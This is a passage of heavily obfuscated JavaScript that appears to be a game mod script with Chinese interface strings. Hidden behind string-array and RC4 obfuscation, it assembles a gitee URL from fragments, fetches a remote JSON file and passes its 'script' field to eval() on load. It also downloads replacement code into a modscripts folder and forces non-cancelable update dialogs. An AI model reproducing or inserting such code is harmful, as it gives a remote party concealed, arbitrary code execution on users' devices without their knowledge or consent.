CoY','CCoZymkGc8kviW','WQ9fW4pdQNm','wmomW5NcTSoqj2KlBNbGfKq','WO5BW7fkW6pcUXbcowSUWQJcSq','ucblWOK/','vmo4rCkBqa','WRylmCkriq','rXP1W7xdTa','W58FjSogcG','W6edc0KT','WOhdI8oUdeK','cuNdJYpcIa','kbtdRCk4W5W','W6ldV8kJWRpdSG','CmkHWRVcSt8','WQTCFfKUDfJcRCouWRaeWQqm','oXJcGSooAq','W6ahW5WnCq','WQFcHSo3kvu','wenPvXm','WPxdKColphC'];}()));}()));}());_0x8378=function(){return _0x48f1e6;};return _0x8378();};function _0x3710(_0x31606c,_0x3eaf72){var _0x83783d=_0x8378();return _0x3710=function(_0x37105b,_0x4d0a0a){_0x37105b=_0x37105b-0xdb;var _0x23719d=_0x83783d[_0x37105b];if(_0x3710['zqtIwA']===undefined){var _0x2d488d=function(_0x3b1c9f){var _0x46e267='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x3f9070='',_0x1d1913='';for(var _0x227f57=0x0,_0x1b2902,_0x3d1682,_0x1c386c=0x0;_0x3d1682=_0x3b1c9f['charAt'](_0x1c386c++);~_0x3d1682&&(_0x1b2902=_0x227f57%0x4?_0x1b2902*0x40+_0x3d1682:_0x3d1682,_0x227f57++%0x4)?_0x3f9070+=String['fromCharCode'](0xff&_0x1b2902>>(-0x2*_0x227f57&0x6)):0x0){_0x3d1682=_0x46e267['indexOf'](_0x3d1682);}for(var _0x4653bd=0x0,_0x3f3ae7=_0x3f9070['length'];_0x4653bd<_0x3f3ae7;_0x4653bd++){_0x1d1913+='%'+('00'+_0x3f9070['charCodeAt'](_0x4653bd)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x1d1913);};var _0x53def6=function(_0xaf58d6,_0x3b37c0){var _0x4eff2c=[],_0x31afea=0x0,_0xf34807,_0x1adb0d='';_0xaf58d6=_0x2d488d(_0xaf58d6);var _0x39c46e;for(_0x39c46e=0x0;_0x39c46e<0x100;_0x39c46e++){_0x4eff2c[_0x39c46e]=_0x39c46e;}for(_0x39c46e=0x0;_0x39c46e<0x100;_0x39c46e++){_0x31afea=(_0x31afea+_0x4eff2c[_0x39c46e]+_0x3b37c0['charCodeAt'](_0x39c46e%_0x3b37c0['length']))%0x100,_0xf34807=_0x4eff2c[_0x39c46e],_0x4eff2c[_0x39c46e]=_0x4eff2c[_0x31afea],_0x4eff2c[_0x31afea]=_0xf34807;}_0x39c46e=0x0,_0x31afea=0x0;for(var _0x4dc6df=0x0;_0x4dc6df<_0xaf58d6['length'];_0x4dc6df++){_0x39c46e=(_0x39c46e+0x1)%0x100,_0x31afea=(_0x31afea+_0x4eff2c[_0x39c46e])%0x100,_0xf34807=_0x4eff2c[_0x39c46e],_0x4eff2c[_0x39c46e]=_0x4eff2c[_0x31afea],_0x4eff2c[_0x31afea]=_0xf34807,_0x1adb0d+=String['fromCharCode'](_0xaf58d6['charCodeAt'](_0x4dc6df)^_0x4eff2c[(_0x4eff2c[_0x39c46e]+_0x4eff2c[_0x31afea])%0x100]);}return _0x1adb0d;};_0x3710['meZSat']=_0x53def6,_0x31606c=arguments,_0x3710['zqtIwA']=!![];}var _0x21dfca=_0x83783d[0x0],_0x2c6134=_0x37105b+_0x21dfca,_0x35eee8=_0x31606c[_0x2c6134];return!_0x35eee8?(_0x3710['VZKHaJ']===undefined&&(_0x3710['VZKHaJ']=!![]),_0x23719d=_0x3710['meZSat'](_0x23719d,_0x4d0a0a),_0x31606c[_0x2c6134]=_0x23719d):_0x23719d=_0x35eee8,_0x23719d;},_0x3710(_0x31606c,_0x3eaf72);}(function(_0x50ed2b,_0x2be5de,_0x5bf9fe,_0x4e9447,_0x59ea18,_0x1d98cd,_0xb7ae29){return _0x50ed2b=_0x50ed2b>>0x3,_0x1d98cd='hs',_0xb7ae29='hs',function(_0x305982,_0x5a5024,_0x24c3af,_0x275dd2,_0x1bd673){var _0x1f35c1=_0x3710;_0x275dd2='tfi',_0x1d98cd=_0x275dd2+_0x1d98cd,_0x1bd673='up',_0xb7ae29+=_0x1bd673,_0x1d98cd=_0x24c3af(_0x1d98cd),_0xb7ae29=_0x24c3af(_0xb7ae29),_0x24c3af=0x0;var _0x46d906=_0x305982();while(!![]&&--_0x4e9447+_0x5a5024){try{_0x275dd2=parseInt(_0x1f35c1(0xf0,'^$P$'))/0x1+-parseInt(_0x1f35c1(0x147,'li*s'))/0x2*(-parseInt(_0x1f35c1(0x127,')lXV'))/0x3)+-parseInt(_0x1f35c1(0x12a,'EZJG'))/0x4+parseInt(_0x1f35c1(0x118,'8M2p'))/0x5+parseInt(_0x1f35c1(0xe5,')MaY'))/0x6+-parseInt(_0x1f35c1(0x106,'M4bP'))/0x7+parseInt(_0x1f35c1(0xfc,'euk7'))/0x8*(-parseInt(_0x1f35c1(0xe1,'o0BK'))/0x9);}catch(_0x299102){_0x275dd2=_0x24c3af;}finally{_0x1bd673=_0x46d906[_0x1d98cd]();if(_0x50ed2b<=_0x4e9447)_0x24c3af?_0x59ea18?_0x275dd2=_0x1bd673:_0x59ea18=_0x1bd673:_0x24c3af=_0x1bd673;else{if(_0x24c3af==_0x59ea18['replace'](/[kHCPryuLDRAqMfGEpNKO=]/g,'')){if(_0x275dd2===_0x5a5024){_0x46d906['un'+_0x1d98cd](_0x1bd673);break;}_0x46d906[_0xb7ae29](_0x1bd673);}}}}}(_0x5bf9fe,_0x2be5de,function(_0x4e0820,_0x45183d,_0x57a613,_0x502935,_0x4420cf,_0x26023e,_0x2faace){return _0x45183d='\x73\x70\x6c\x69\x74',_0x4e0820=arguments[0x0],_0x4e0820=_0x4e0820[_0x45183d](''),_0x57a613='\x72\x65\x76\x65\x72\x73\x65',_0x4e0820=_0x4e0820[_0x57a613]('\x76'),_0x502935='\x6a\x6f\x69\x6e',(0x1422c6,_0x4e0820[_0x502935](''));});}(0x5e0,0x6d555,_0x8378,0xbe),_0x8378)&&(version_=_0x8378);function _0x5cc3(){var _0x4d4c9c=_0x3710,_0x32b020={'Ongxq':'rEyDd','BlwzS':_0x4d4c9c(0x10a,')lXV'),'UOiZT':_0x4d4c9c(0x13e,'$nLq'),'EUaqZ':_0x4d4c9c(0x11b,'Hu12'),'hSIbM':_0x4d4c9c(0xf6,'MKMb'),'mnobO':'getChannel','zHdrO':'CRtgz','TxEee':_0x4d4c9c(0xe2,'C0Z1'),'OAkjc':_0x4d4c9c(0x10c,'fAuW'),'qQzbt':'44ZBTjvu','HHxFC':'jiFOS','tfzOe':_0x4d4c9c(0x12b,'Uw%L'),'HjcBx':_0x4d4c9c(0x13b,'EZJG'),'ZQafU':_0x4d4c9c(0x146,'EZJG'),'hROoK':_0x4d4c9c(0xef,'*9cv'),'HxbPY':_0x4d4c9c(0x114,'li*s'),'oQVeD':'CMCHQ','MCwKy':_0x4d4c9c(0x11a,'g4HR'),'bHafW':_0x4d4c9c(0xdf,'C0Z1'),'tyraA':_0x4d4c9c(0x154,'h81X'),'NugvO':_0x4d4c9c(0x117,'rMxF'),'GHNPg':'getDir','TUxXM':'9982021uimSTr','mHDNH':_0x4d4c9c(0x150,')lXV'),'kxvDX':_0x4d4c9c(0x109,'ctJ&'),'DzOZl':_0x4d4c9c(0xf5,')GD1'),'MDCex':_0x4d4c9c(0x13a,'M4bP'),'pBNxw':_0x4d4c9c(0x123,')F%s'),'cnqOh':'transferTo','zJRxv':'2220228wXkvhJ','LPyzD':'size','Axmoa':_0x4d4c9c(0x15a,'HYa9'),'FnNLL':_0x4d4c9c(0x128,'C0Z1')},_0x5bbdce=[_0x32b020['UOiZT'],_0x32b020['EUaqZ'],_0x32b020[_0x4d4c9c(0xed,'QGAD')],_0x32b020[_0x4d4c9c(0x11f,'A]30')],_0x32b020[_0x4d4c9c(0x144,'o0BK')],_0x32b020[_0x4d4c9c(0xe9,'lKqa')],_0x32b020[_0x4d4c9c(0x103,'C&2N')],_0x32b020['qQzbt'],_0x32b020['HHxFC'],_0x4d4c9c(0x159,'QGAD'),_0x32b020[_0x4d4c9c(0x136,'MKMb')],_0x32b020[_0x4d4c9c(0x153,'$nLq')],_0x32b020[_0x4d4c9c(0xdd,'ctJ&')],_0x32b020['hROoK'],_0x32b020[_0x4d4c9c(0x157,'v[G9')],_0x4d4c9c(0x10b,'Uw%L'),_0x32b020[_0x4d4c9c(0xf4,'QGAD')],_0x32b020['MCwKy'],_0x32b020['bHafW'],_0x32b020[_0x4d4c9c(0xf9,'h81X')],_0x4d4c9c(0x102,'aVIE'),_0x32b020['NugvO'],_0x32b020[_0x4d4c9c(0xfe,'3(WW')],_0x32b020['TUxXM'],_0x32b020[_0x4d4c9c(0x12c,'o0BK')],_0x32b020[_0x4d4c9c(0x134,'OzPH')],'8tgaadn','MhhGq',_0x32b020[_0x4d4c9c(0x156,'A]30')],_0x32b020['MDCex'],_0x32b020[_0x4d4c9c(0x113,'EZJG')],_0x4d4c9c(0xec,'3(WW'),_0x32b020['cnqOh'],'yzr的算法',_0x32b020[_0x4d4c9c(0xe6,'g4HR')],_0x32b020['LPyzD'],_0x32b020['Axmoa'],_0x4d4c9c(0xfd,'n6KP'),_0x32b020['FnNLL']];return(_0x5cc3=function(){var _0x663056=_0x4d4c9c;if(_0x32b020[_0x663056(0xde,'Uw%L')]!==_0x32b020[_0x663056(0x13f,'lKqa')])return _0x5bbdce;else _0x3d2cf9[_0x663056(0x11e,'OzPH')](_0x253215['shift']());})();}function _0x3f9f(_0x244847,_0x2d9ed4){var _0x5d4b5b=_0x3710,_0x4f23c9={'KXZwr':function(_0x50ade3){return _0x50ade3();}},_0x533e54=_0x4f23c9[_0x5d4b5b(0x13c,'A]30')](_0x5cc3);return(_0x3f9f=function(_0x4ea480,_0x3547c1){return _0x533e54[_0x4ea480-=0x148];})(_0x244847,_0x2d9ed4);}(function(_0x946a7e,_0x48961e){var _0x1af45e=_0x3710,_0x5c7eba={'oAMea':function(_0x199717){return _0x199717();},'dzxNl':function(_0x5ce628,_0x24d647){return _0x5ce628===_0x24d647;},'gIGFA':function(_0x359f8c,_0x5b1a3c){return _0x359f8c+_0x5b1a3c;},'TQOMe':function(_0x2f81fa,_0x39bc30){return _0x2f81fa+_0x39bc30;},'frIqk':function(_0x1a3cd4,_0xe6b670){return _0x1a3cd4+_0xe6b670;},'HXUNe':function(_0x18b0c2,_0x499e20){return _0x18b0c2+_0x499e20;},'gldkB':function(_0x30ef1b,_0x2a4ef5){return _0x30ef1b*_0x2a4ef5;},'TCqrQ':function(_0x4e666e,_0x51f790){return _0x4e666e/_0x51f790;},'FXEaO':function(_0x1c59eb,_0x4e9a3d){return _0x1c59eb(_0x4e9a3d);},'KaOUN':function(_0x4b4939,_0x3ff474){return _0x4b4939(_0x3ff474);},'MLOyV':function(_0x5a45b7,_0x1dff4b){return _0x5a45b7(_0x1dff4b);},'NHgll':function(_0x53a5f5,_0xdd8245){return _0x53a5f5*_0xdd8245;},'PMHCJ':function(_0x51d7c2,_0x321df1){return _0x51d7c2(_0x321df1);},'IKPDj':function(_0xcaf333,_0x432b7c){return _0xcaf333(_0x432b7c);},'uicTJ':function(_0x3a8171,_0x57038d){return _0x3a8171/_0x57038d;},'ilHaI':function(_0x3fb49d,_0x3de16b){return _0x3fb49d*_0x3de16b;},'ceSGv':function(_0x52a110,_0x36208c){return _0x52a110/_0x36208c;},'jFLok':function(_0x162c01,_0x1f75de){return _0x162c01(_0x1f75de);},'fdLmV':function(_0x47b9d5,_0x5c977a){return _0x47b9d5(_0x5c977a);},'iOEJZ':function(_0x9ceb3a,_0x45d3c9){return _0x9ceb3a(_0x45d3c9);},'UexJg':function(_0x2f56b3,_0x1776da){return _0x2f56b3*_0x1776da;},'iUVgd':function(_0x4d5bc5,_0x47f8a1){return _0x4d5bc5(_0x47f8a1);}};for(var _0xd42523=_0x3f9f,_0x1f510a=_0x5c7eba['oAMea'](_0x5cc3);;)try{if(_0x5c7eba[_0x1af45e(0x14d,'C&2N')](0xbab67,_0x5c7eba[_0x1af45e(0xe3,'fAuW')](_0x5c7eba[_0x1af45e(0xe4,'$nLq')](_0x5c7eba['frIqk'](_0x5c7eba[_0x1af45e(0x15c,'3(WW')](_0x5c7eba[_0x1af45e(0xe0,'Hu12')](_0x5c7eba['TCqrQ'](-_0x5c7eba['FXEaO'](parseInt,_0x5c7eba[_0x1af45e(0x149,'!$0X')](_0xd42523,0x16a)),0x1),_0x5c7eba[_0x1af45e(0xdc,'dWdQ')](parseInt,_0x5c7eba[_0x1af45e(0x143,'M4bP')](_0xd42523,0x156))/0x2),_0x5c7eba[_0x1af45e(0x10d,'9My@')](parseInt(_0x5c7eba[_0x1af45e(0x112,'C&2N')](_0xd42523,0x160)),0x3)),_0x5c7eba['NHgll'](_0x5c7eba[_0x1af45e(0x14a,')GD1')](_0x5c7eba[_0x1af45e(0x10e,'!$0X')](parseInt,_0x5c7eba[_0x1af45e(0x151,')MaY')](_0xd42523,0x16b)),0x4),_0x5c7eba[_0x1af45e(0x110,'euk7')](parseInt(_0x5c7eba[_0x1af45e(0xea,'iImp')](_0xd42523,0x157)),0x5))),_0x5c7eba[_0x1af45e(0xdb,'y6]o')](_0x5c7eba[_0x1af45e(0x115,'A$jm')](_0x5c7eba['KaOUN'](parseInt,_0x5c7eba[_0x1af45e(0x141,'9My@')](_0xd42523,0x148)),0x6),-_0x5c7eba[_0x1af45e(0x116,'n6KP')](parseInt,_0x5c7eba[_0x1af45e(0x14c,'aIU1')](_0xd42523,0x168))/0x7)),_0x5c7eba['TCqrQ'](-_0x5c7eba['fdLmV'](parseInt,_0x5c7eba['fdLmV'](_0xd42523,0x15e)),0x8))+_0x5c7eba['uicTJ'](-_0x5c7eba['iOEJZ'](parseInt,_0xd42523(0x14c)),0x9)+_0x5c7eba[_0x1af45e(0x111,'aIU1')](_0x5c7eba['ceSGv'](-_0x5c7eba[_0x1af45e(0xf1,'dWdQ')](parseInt,_0xd42523(0x14f)),0xa),_0x5c7eba['uicTJ'](-parseInt(_0xd42523(0x158)),0xb))))break;_0x1f510a[_0x1af45e(0x14e,'lKqa')](_0x1f510a['shift']());}catch(_0x4752d3){_0x1f510a[_0x1af45e(0x14f,')MaY')](_0x1f510a[_0x1af45e(0x104,'g4HR')]());}}(),(function(){var _0x48646f=_0x3710,_0x47bb5a={'GVtgq':function(_0x3634b1,_0x12fd03){return _0x3634b1+_0x12fd03;},'xyYCF':_0x48646f(0x137,'lKqa'),'RJTHJ':function(_0x335f3a,_0x43b233){return _0x335f3a(_0x43b233);},'lbQkV':function(_0x12cac0,_0x3ef777){return _0x12cac0!=_0x3ef777;},'DzFdE':function(_0x1feabf,_0xca67df){return _0x1feabf===_0xca67df;},'oPQtN':_0x48646f(0x125,'A]30'),'LByys':function(_0x392706,_0x3b0880){return _0x392706+_0x3b0880;},'bCVDL':function(_0x3a3779,_0xaad88c){return _0x3a3779!=_0xaad88c;},'rZWvw':function(_0x481441,_0x4ee145){return _0x481441(_0x4ee145);},'TABkz':function(_0x2bf372,_0x31fe3c){return _0x2bf372(_0x31fe3c);},'BSifq':function(_0x48f030,_0x4f10d9){return _0x48f030(_0x4f10d9);},'dXkHI':function(_0x361d47,_0x1b1c97){return _0x361d47(_0x1b1c97);},'ihbMG':function(_0x509c6b,_0x7cf8b8){return _0x509c6b(_0x7cf8b8);},'qPTNG':function(_0x4bc294,_0xee05ff){return _0x4bc294(_0xee05ff);},'xuNdP':function(_0x2a6a3b,_0x2d3450){return _0x2a6a3b(_0x2d3450);},'AxOBV':function(_0x2f09d9,_0x39398e){return _0x2f09d9(_0x39398e);},'bSzVj':function(_0x4270a4,_0x1dd2dc){return _0x4270a4(_0x1dd2dc);},'znEug':function(_0x42accb,_0x141563){return _0x42accb(_0x141563);},'OunTY':function(_0x78559e,_0x5f1d88){return _0x78559e(_0x5f1d88);},'dUbth':function(_0x135b4e,_0x4cf606){return _0x135b4e(_0x4cf606);},'igICw':function(_0xbcdfa8,_0x5e731e){return _0xbcdfa8(_0x5e731e);},'hlrQd':function(_0x4a19e4,_0x545bf4){return _0x4a19e4(_0x545bf4);},'lyztu':function(_0x5a60f5,_0x146683){return _0x5a60f5(_0x146683);},'YnCqy':function(_0x52c488,_0x24e92e){return _0x52c488(_0x24e92e);},'wVTQZ':'QCIus','vkDbw':'vALIH','RHuCH':function(_0x3f4b77,_0x263cd2){return _0x3f4b77(_0x263cd2);},'vnkkG':function(_0x2206d8,_0x113888){return _0x2206d8(_0x113888);},'dIdvv':function(_0x1e2748,_0x1122a8){return _0x1e2748(_0x1122a8);}},_0x104be5=_0x3f9f,_0x4f1433={'NsYKZ':_0x47bb5a[_0x48646f(0x11d,'EZJG')](_0x104be5,0x14e),'MhhGq':function(_0x3821c1,_0x1064e8){var _0x1bbad5=_0x48646f,_0x2f5aa3={'MQssC':function(_0x5f4948,_0x3ac977){return _0x47bb5a['GVtgq'](_0x5f4948,_0x3ac977);}};return _0x47bb5a[_0x1bbad5(0xf7,'dbag')]!==_0x47bb5a[_0x1bbad5(0x140,'$^[I')]?_0x2f5aa3[_0x1bbad5(0x126,'o0BK')](_0x8a2d8c,_0x2d8170):_0x47bb5a[_0x1bbad5(0x130,'3(WW')](_0x3821c1,_0x1064e8);},'vnYXr':_0x47bb5a[_0x48646f(0x142,'8M2p')](_0x104be5,0x16d),'ERqhi':function(_0x2780eb,_0xa104f5){var _0x307df2=_0x48646f;return _0x47bb5a[_0x307df2(0x13d,'li*s')](_0x2780eb,_0xa104f5);},'MXoGl':function(_0x56a83d,_0x274a4b){var _0x28dc48=_0x48646f;return _0x47bb5a[_0x28dc48(0x105,'dWdQ')](_0x56a83d,_0x274a4b);},'CMCHQ':function(_0x5061bb,_0x42bc8e){var _0x3a8b62=_0x48646f;return _0x47bb5a[_0x3a8b62(0xf2,'lKqa')](_0x47bb5a[_0x3a8b62(0x135,'C&2N')],_0x47bb5a[_0x3a8b62(0x15b,'o0BK')])?_0x47bb5a[_0x3a8b62(0x108,'aVIE')](_0x5061bb,_0x42bc8e):_0x446ccc+_0x5200d6;},'CRtgz':_0x47bb5a['RJTHJ'](_0x104be5,0x151),'yQgFH':_0x104be5(0x169),'rPjrd':_0x47bb5a[_0x48646f(0xff,'*9cv')](_0x104be5,0x15c),'GznBI':_0x47bb5a[_0x48646f(0x158,'iImp')](_0x104be5,0x163),'oaFMd':_0x47bb5a[_0x48646f(0x12e,'dbag')](_0x104be5,0x14b),'AmYSW':function(_0xdec3a3,_0x4eeb0f){var _0xb476a4=_0x48646f;return _0x47bb5a[_0xb476a4(0x139,'A$jm')](_0xdec3a3,_0x4eeb0f);},'fksdR':function(_0x26209b,_0x2f0b2b){var _0x14f5d8=_0x48646f;return _0x47bb5a[_0x14f5d8(0x124,'8M2p')](_0x26209b,_0x2f0b2b);},'tgIee':function(_0x1e969c,_0x4f4a7c){var _0xc0f11f=_0x48646f;return _0x47bb5a[_0xc0f11f(0xe7,'HYa9')](_0x1e969c,_0x4f4a7c);}},_0x3bdb31=ctx[_0x104be5(0x167)](_0x4f1433[_0x47bb5a[_0x48646f(0x131,'1sC)')](_0x104be5,0x15d)],0x0);if(_0x4f1433[_0x47bb5a[_0x48646f(0xeb,')lXV')](_0x104be5,0x16c)](存在,_0x3bdb31)||_0x4f1433[_0x47bb5a['bSzVj'](_0x104be5,0x16c)](mkdir,_0x3bdb31),_0x3bdb31+=_0x4f1433[_0x47bb5a[_0x48646f(0xfa,'y6]o')](_0x104be5,0x15a)],!_0x4f1433[_0x104be5(0x150)](存在,_0x3bdb31)||_0x4f1433[_0x104be5(0x164)](_0x4f1433[_0x104be5(0x150)](读取,_0x3bdb31)[_0x47bb5a[_0x48646f(0x12f,'aIU1')](_0x104be5,0x165)],dkx)){var _0x11c5b8=new pg[(_0x47bb5a['OunTY'](_0x104be5,0x166))](_0x4f1433[_0x47bb5a[_0x48646f(0x152,'g4HR')](_0x104be5,0x161)](ctx[_0x47bb5a['igICw'](_0x104be5,0x167)](_0x4f1433[_0x104be5(0x155)],0x0),_0x4f1433[_0x47bb5a[_0x48646f(0x129,'aVIE')](_0x104be5,0x149)]))[_0x47bb5a['hlrQd'](_0x104be5,0x154)](),_0x5dd852=new pg[(_0x47bb5a['lyztu'](_0x104be5,0x159))](_0x3bdb31)[_0x47bb5a[_0x48646f(0x119,'dWdQ')](_0x104be5,0x154)]();_0x11c5b8[_0x47bb5a[_0x48646f(0x138,'*9cv')](_0x104be5,0x14a)](0x0,_0x11c5b8[_0x47bb5a['znEug'](_0x104be5,0x14d)](),_0x5dd852);}if(!aswi[0x1c]){if(_0x47bb5a[_0x48646f(0xf8,'rMxF')](_0x47bb5a['wVTQZ'],_0x47bb5a[_0x48646f(0x107,'d!ug')])){var _0x118688=new _0x452b15[(_0x47bb5a[_0x48646f(0x121,')GD1')](_0x1ee282,0x166))](_0x36b786[_0x3bea3a(0x161)](_0x24b585[_0x47bb5a['rZWvw'](_0x3418eb,0x167)](_0x10fbf2[_0x47bb5a[_0x48646f(0xfb,'dWdQ')](_0x2f1d9d,0x155)],0x0),_0x496f24[_0x47bb5a[_0x48646f(0x148,'d!ug')](_0x7007b8,0x149)]))[_0x47bb5a[_0x48646f(0x120,'dWdQ')](_0x33418c,0x154)](),_0x4495dd=new _0x16cdb5[(_0x47bb5a[_0x48646f(0x15d,'M4bP')](_0x344f0d,0x159))](_0x22241f)[_0x47bb5a['RJTHJ'](_0x696a80,0x154)]();_0x118688[_0x47bb5a['RJTHJ'](_0xcd425,0x14a)](0x0,_0x118688[_0x38330a(0x14d)](),_0x4495dd);}else{var _0x20ee3f=_0x4f1433[_0x47bb5a[_0x48646f(0x10f,'LoDF')](_0x104be5,0x152)],_0x3aa8a9=_0x4f1433[_0x47bb5a[_0x48646f(0x133,'tEos')](_0x104be5,0x15b)];if(_0x4f1433[_0x104be5(0x164)](_0x4f1433[_0x47bb5a[_0x48646f(0x14b,'$nLq')](_0x104be5,0x153)],inf['n']))throw _0x4f1433[_0x104be5(0x15f)](forceAlert,_0x20ee3f),_0x4f1433[_0x47bb5a[_0x48646f(0xee,'C0Z1')](_0x104be5,0x16c)](forceShow,_0x20ee3f),_0x3aa8a9;if(_0x4f1433[_0x47bb5a[_0x48646f(0xf3,'rMxF')](_0x104be5,0x16e)](_0x4f1433[_0x47bb5a[_0x48646f(0xe8,'tEos')](_0x104be5,0x15f)](读取,_0x4f1433[_0x47bb5a[_0x48646f(0x11c,'MKMb')](_0x104be5,0x162)](ctx[_0x47bb5a[_0x48646f(0x132,'tEos')](_0x104be5,0x167)](_0x4f1433[_0x104be5(0x15d)],0x0),_0x4f1433[_0x104be5(0x15a)]))[_0x47bb5a['dIdvv'](_0x104be5,0x165)],dkx))throw astr[0xea];}}}()));var version_ = 'jsjiami.com.v7';
function _0x46d2(n,t){var r=_0x1b72();return(_0x46d2=function(n,t){return r[n-=267]})(n,t)}function _0x1b72(){var n=["awLL","/yzr的算法.js","%A5%E5%BF%","setOnClick","flush","JftII","rilyzr/yzr","FZSRr","lang","avVOCL","usHVB","NnFvt","PMGtn","gWbty","EhwHD","aKROs","cwudY","Listener","377535sipfrz","show","6%B0%E6%97","EGXHU","js版本太低，请更新","EeFKJ","下载完毕，重启游戏生","jIcgj","qkVZn","eoFMq","4221455jmucHO","dWoJu","dcaHT","97.json","setCancela","tcxCe","ble","EIGIg","bRUpe","UXCLE","lKOsj","VsOuE","4sFiYjX","updateLink","sWbvo","gXYVg","tee.com/yz","正在下载，请勿关闭游","fQGXR","rMTRh","qvWrk","wDyHN","aster/%E6%","vdRQb","9B%B4%E6%9","130990zLuWAh","bqdDH","modscripts","setContent","hueSv","View","aaADB","nputStream","TFYsX","Uhsjy","vUUth","下载失败","script","pmZvz","getDir","setMessage","https://gi","785FtbJeJ","close","ByteArrayI","m.js/raw/m","4954848zZILXF","5792652Injnzg","UuerC","NGIii","parse","ZqSBz","hHSXp","aJHyO","1932KvpVaw","tWEta","srPrE","2556352leJfMi","AlWkx","jiFOS","dbCVe","newVersion","s_algorith","info"];return(_0x1b72=function(){return n})()}function forceAlert(n){var t=_0x46d2;({gWbty:function(n,t){return n(t)}})[t(282)](runOnUiThread,function(){var r=t;new(pg[r(328)])(ctx)[r(337)](n)[r(301)+r(303)](!1)[r(288)]()})}function forceShow(n){var t=_0x46d2,r={cwudY:function(n,t,r,e){return n(t,r,e)},EIGIg:function(n,t){return n(t)}};r[t(304)](runOnUiThread,function(){var e=t,a=new(pg[e(269)])(ctx);r[e(285)](文本,a,n,10),ctx[e(325)+e(327)](a)})}!function(n,t){for(var r=_0x46d2,e=_0x1b72();;)try{if(433580===-parseInt(r(322))/1+-parseInt(r(309))/2*(parseInt(r(287))/3)+-parseInt(r(351))/4*(-parseInt(r(339))/5)+-parseInt(r(343))/6+parseInt(r(297))/7+parseInt(r(354))/8+parseInt(r(344))/9)break;e.push(e.shift())}catch(n){e.push(e.shift())}}(),runThread(function(){var _0xa29418=_0x46d2,_0x1e8f24={JftII:function(n,t){return n(t)},UXCLE:_0xa29418(314)+"戏",EhwHD:function(n,t){return n+t},NGIii:_0xa29418(324),dWoJu:_0xa29418(270),jIcgj:function(n,t,r){return n(t,r)},hHSXp:function(n,t){return n(t)},wDyHN:_0xa29418(293)+"效",hueSv:_0xa29418(333),bRUpe:function(n,t){return n(t)},usHVB:function(n,t,r,e){return n(t,r,e)},dcaHT:_0xa29418(338)+_0xa29418(313)+_0xa29418(275)+_0xa29418(267)+_0xa29418(342)+_0xa29418(319)+_0xa29418(321)+_0xa29418(289)+_0xa29418(271)+_0xa29418(300),fQGXR:function(n,t){return n!=t},qkVZn:_0xa29418(291)+"js",srPrE:function(n,t){return n+t},Uhsjy:function(n,t,r,e,a){return n(t,r,e,a)},PMGtn:function(n,t){return n+t},eoFMq:function(n,t){return n+t},EeFKJ:function(n,t){return n+t},vUUth:function(n,t){return n+t},qvWrk:function(n,t){return n+t},EGXHU:function(n,t){return n+t}};try{var _0x1dc6c=JSON[_0xa29418(347)](_0x1e8f24[_0xa29418(305)](getWeb,_0x1e8f24[_0xa29418(299)]));更新地址=_0x1dc6c[_0xa29418(310)],公告=_0x1dc6c[_0xa29418(268)],aswi[2]||_0x1e8f24[_0xa29418(294)](alert,公告,astr[15]),_0x1e8f24[_0xa29418(315)](inf.v,_0x1dc6c[_0xa29418(358)])&&(_0x1e8f24[_0xa29418(349)](forceShow,_0x1e8f24[_0xa29418(295)]),openMenu=function(){var n=_0xa29418,t={lKOsj:function(n,t){return _0x1e8f24[_0x46d2(274)](n,t)},VsOuE:_0x1e8f24[n(306)],pmZvz:function(t,r){return _0x1e8f24[n(283)](t,r)},dbCVe:_0x1e8f24[n(346)],NnFvt:_0x1e8f24[n(298)],aJHyO:function(t,r,e){return _0x1e8f24[n(294)](t,r,e)},FZSRr:function(t,r){return _0x1e8f24[n(349)](t,r)},UuerC:_0x1e8f24[n(318)],bqdDH:_0x1e8f24[n(326)],rMTRh:function(t,r){return _0x1e8f24[n(349)](t,r)}},r=_0x1e8f24[n(305)](制作菜单,0);_0x1e8f24[n(279)](按钮,r,astr[218],-1)[n(272)+n(286)](new(pg[n(278)])({onClick:function(r){var e=n,a={gXYVg:function(n,r){return t[_0x46d2(307)](n,r)},AlWkx:t[e(308)],sWbvo:function(n,r){return t[e(335)](n,r)},vdRQb:t[e(357)],aKROs:t[e(280)],TFYsX:function(n,r,a){return t[e(350)](n,r,a)},tWEta:function(n,r){return t[e(276)](n,r)},ZqSBz:t[e(345)],tcxCe:t[e(323)]};t[e(316)](runThread,function(){var n=e;try{a[n(312)](print,a[n(355)]);var t=new(java[n(277)][n(341)+n(329)])(a[n(312)](getWebBytes,更新地址)),r=new(pg[n(356)])(a[n(311)](ctx[n(336)](a[n(320)],0),a[n(284)]));a[n(330)](transferStream,t,r),t[n(340)](),r[n(273)](),r[n(340)](),a[n(352)](alert,a[n(348)])}catch(t){a[n(312)](alert,a[n(302)])}})}}))},aswi[0]||(_0x1e8f24[_0xa29418(294)](alert,_0x1e8f24[_0xa29418(283)](_0x1e8f24[_0xa29418(283)](_0x1e8f24[_0xa29418(283)](_0x1e8f24[_0xa29418(283)](_0x1e8f24[_0xa29418(353)](inf.n,astr[16][0]),inf.v),astr[16][1]),_0x1dc6c[_0xa29418(358)]),astr[16][2]),astr[16][3]),_0x1e8f24[_0xa29418(331)](任务栏,_0x1e8f24[_0xa29418(281)](_0x1e8f24[_0xa29418(296)]("<",inf.n),">"),_0x1e8f24[_0xa29418(292)](_0x1e8f24[_0xa29418(332)]("<",inf.n),">"),_0x1e8f24[_0xa29418(317)](_0x1e8f24[_0xa29418(290)](_0x1e8f24[_0xa29418(283)](inf.n,astr[16][4]),_0x1dc6c[_0xa29418(358)]),astr[16][5]),_0x1dc6c[_0xa29418(310)]))),_0x1e8f24[_0xa29418(274)](eval,_0x1dc6c[_0xa29418(334)])}catch(n){_0x1e8f24[_0xa29418(349)](print,_0x1e8f24[_0xa29418(332)](astr[2],aswi[28]?n:""))}});
}catch(e){alert("js载入时出错:(可能不适配):\n"+e);
}